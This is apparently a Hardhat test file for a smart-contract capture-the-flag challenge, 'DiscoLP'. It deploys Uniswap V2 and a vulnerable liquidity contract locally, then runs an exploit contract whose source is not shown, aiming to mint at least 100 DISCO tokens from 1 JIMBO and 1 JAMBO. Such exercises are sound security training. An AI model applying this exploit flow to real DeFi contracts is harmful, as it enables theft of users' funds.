const { expect } = require("chai");
const { ethers } = require("hardhat");
//const { web3 } = require("web3");

const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
// https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
// https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Factory.sol
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");
// https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol

describe("DiscoLP Challenge", function () {


  before(async function () {
    const ATTACKER_INIT_BALANCE = ethers.utils.parseEther("1");

    [deployer, attacker, temp] = await ethers.getSigners();

    const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
    const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
    const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);

    // Deploy tokens to be traded
    this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

    // Deploy Uniswap Factory and Router
    this.uniswap_factory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
    this.uniswap_router = await UniswapRouterFactory.deploy(
        this.uniswap_factory.address,
        this.weth.address
    );

    const DiscoLPFactoryFactory = await ethers.getContractFactory("DiscoLPFactory", attacker);
    this.disco_lp_factory = await DiscoLPFactoryFactory.deploy();
    await this.disco_lp_factory.createInstance(this.uniswap_factory.address, this.uniswap_router.address);

    
    const DiscoLPFactory = await ethers.getContractFactory("DiscoLP", deployer);
    this.disco_lp = await DiscoLPFactory.attach(await this.disco_lp_factory.disco_lp());

    console.log("DiscoLP Contract Address :", this.disco_lp.address);

    const Token2Factory = await ethers.getContractFactory("Token2", deployer);
    this.jimbo = await Token2Factory.attach(await this.disco_lp_factory.token_a_jimbo());
    this.jambo = await Token2Factory.attach(await this.disco_lp_factory.token_b_jambo());

    console.log("JIMBO Contract Address :", this.jimbo.address);
    console.log("JAMBO Contract Address :", this.jambo.address);

    // DISCO is deposit reward (pair token of JIMBO-JAMBO)

    console.log("====================== Balance of DiscoLP ======================");
    console.log("DISCO :", await this.disco_lp.balanceOf(this.disco_lp.address));
    console.log("JIMBO :", await this.jimbo.balanceOf(this.disco_lp.address));
    console.log("JAMBO :", await this.jambo.balanceOf(this.disco_lp.address));

    console.log("====================== Balance of Attacker ======================");
    console.log("DISCO :", await this.disco_lp.balanceOf(attacker.address));
    console.log("JIMBO :", await this.jimbo.balanceOf(attacker.address));
    console.log("JAMBO :", await this.jambo.balanceOf(attacker.address));

  });

  it('Exploit', async function () {
    console.log("============================================ Exploit ============================================");

    // deposit test
    // await this.jimbo.connect(attacker).approve(this.disco_lp.address, ethers.utils.parseEther("1"));
    // await this.disco_lp.connect(attacker).depositToken(this.jimbo.address, ethers.utils.parseEther("1"), 1);    // DISCO 0.499..
    // await this.jambo.connect(attacker).approve(this.disco_lp.address, ethers.utils.parseEther("1"));
    // await this.disco_lp.connect(attacker).depositToken(this.jambo.address, ethers.utils.parseEther("1"), 1);    // DISCO 0.998..

    let pair_addr = await this.disco_lp_factory.reserveToken();
    //console.log(pair_addr);

    const ExploitFactory = await ethers.getContractFactory("DiscoLPExploit", attacker);
    this.exploit = await ExploitFactory.deploy(this.uniswap_factory.address, this.uniswap_router.address, this.disco_lp.address, pair_addr);

    await this.jimbo.connect(attacker).transfer(this.exploit.address, ethers.utils.parseEther("1"));
    await this.jambo.connect(attacker).transfer(this.exploit.address, ethers.utils.parseEther("1"));

    await this.exploit.exploit();

    console.log("====================== Balance of DiscoLP ======================");
    console.log("DISCO :", await this.disco_lp.balanceOf(this.disco_lp.address));
    console.log("JIMBO :", await this.jimbo.balanceOf(this.disco_lp.address));
    console.log("JAMBO :", await this.jambo.balanceOf(this.disco_lp.address));

    console.log("====================== Balance of Attacker ======================");
    console.log("DISCO :", await this.disco_lp.balanceOf(attacker.address));
    console.log("JIMBO :", await this.jimbo.balanceOf(attacker.address));
    console.log("JAMBO :", await this.jambo.balanceOf(attacker.address));

  });

  after(async function () {
    // SUCCESS CONDITIONS
    expect(
      await this.disco_lp.balanceOf(attacker.address)
    ).to.be.gte(ethers.utils.parseEther("100"))
  });
});
